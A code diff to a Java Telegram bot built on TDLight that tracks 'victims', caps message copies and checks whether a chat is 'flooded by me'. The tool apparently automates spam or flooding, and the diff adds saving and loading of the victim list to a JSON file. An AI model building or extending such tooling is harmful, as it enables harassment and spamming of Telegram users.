@@ -1,7 +1,9 @@
 package com.pnet;
 
+import com.pnet.secure.Config;
 import it.tdlight.tdlight.utils.CantLoadLibrary;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -10,14 +12,16 @@ public class Router {
     private static final int MAX_VICTIM_ID = 1266000000;
     private static final int MAX_COPIES = 3;
     private Telega telega;
-    private final ConcurrentHashMap<Integer, Victim> victims = new ConcurrentHashMap<>();
+    private ConcurrentHashMap<Integer, Victim> victims = new ConcurrentHashMap<>();
     private int copiesSent;
 
-    public void Init() throws CantLoadLibrary {
+    public void Init() throws CantLoadLibrary, IOException {
+        load();
         telega = new Telega();
         telega.init();
         telega.onMessage = this::onMessage;
     }
+
 
     public void run() {
         while(true)
@@ -38,7 +42,20 @@ public class Router {
         save();
     }
 
+    private void load() throws IOException {
+        victims=new ConfigService().ReadJsonFile(victims.getClass(), getVictimsFilePath());
+    }
+
     private void save() {
+        try {
+            new ConfigService().WriteJsonFile(getVictimsFilePath(), victims);
+        } catch (IOException ioException) {
+            ioException.printStackTrace();
+        }
+    }
+
+    private String getVictimsFilePath() {
+        return Config.toAbsolutePath("victims.json");
     }
 
     private Victim newVictim() {
@@ -71,6 +88,8 @@ public class Router {
             return false;
         if(!isChatTailFloodedByMe(victim))
             return false;
+
+        return true;
     }
 
     private boolean isChatTailFloodedByMe(Victim victim) {
